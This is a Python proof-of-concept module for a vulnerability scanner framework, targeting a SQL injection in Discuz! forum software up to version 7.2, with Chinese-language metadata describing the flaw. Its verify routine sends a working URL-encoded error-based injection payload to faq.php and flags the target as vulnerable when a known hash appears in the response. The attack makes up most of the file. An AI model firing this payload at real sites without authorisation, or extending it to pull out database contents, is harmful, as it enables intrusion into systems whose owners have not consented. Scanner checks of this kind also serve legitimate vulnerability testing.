# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Discuz_0035'  # 平台漏洞编号，留空
    name = 'Discuz <= 7.2 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-02'  # 漏洞公布时间
    desc = '''
        代码原本期望得到一个经过daddslashes()安全处理后的数组变量$xigr['hi'],但是没有对变量$xigr做严格的类型规定，当我们提交一个字符串变量$xigr='ryat,
        经过处理变为\'ryat,到最后$xigr['hi']就会输出\,如果这个变量引入到SQL语句,那么就会引起严重的安全问题了。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1834/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Discuz!'  # 漏洞应用名称
    product_version = '<= 7.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fad145cf-8dba-4248-8b8c-d8673445c5ad'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28md5%28c%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
